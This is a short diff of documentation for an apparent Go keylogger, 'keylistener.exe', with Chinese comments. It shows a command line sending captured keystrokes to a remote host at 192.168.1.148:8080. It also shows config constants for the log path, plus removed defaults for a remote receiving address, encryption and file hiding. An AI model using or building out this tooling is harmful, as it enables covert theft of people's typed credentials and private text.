@@ -46,9 +46,6 @@ $ keylistener.exe -E -H -lh 192.168.1.148:8080
 // 默认配置
 const (
 	defaultPath     = "c:\\sys\\key.txt"     // 默认文件保存路径
-	defaultHost     = "192.168.252.130:8080" // 默认远程接收地址
-	defaultIsEncode = true                   // 默认进行文本加密
-	defaultIsHidden = true                   // 默认进行文件隐藏
 )
 ```
 
